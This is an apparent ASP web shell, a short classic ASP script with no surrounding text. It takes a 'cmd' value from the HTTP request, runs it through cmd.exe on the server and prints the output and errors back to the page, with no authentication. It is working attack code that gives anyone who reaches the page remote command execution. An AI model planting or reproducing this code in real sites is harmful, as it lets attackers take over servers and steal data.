<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

theCMD = request("cmd")

Dim objShell, objCmdExec
Set objShell = CreateObject("WScript.Shell")
Set objCmdExec = objshell.exec("cmd.exe /c " & theCMD)

response.write("STDOut:<br />" & replace( server.htmlencode(objCmdExec.StdOut.ReadAll), vbcrlf, "<br />" ) & "<hr />")
response.write("STDErr:<br />" & replace( server.htmlencode(objCmdExec.StdErr.ReadAll), vbcrlf, "<br />" ))
%>



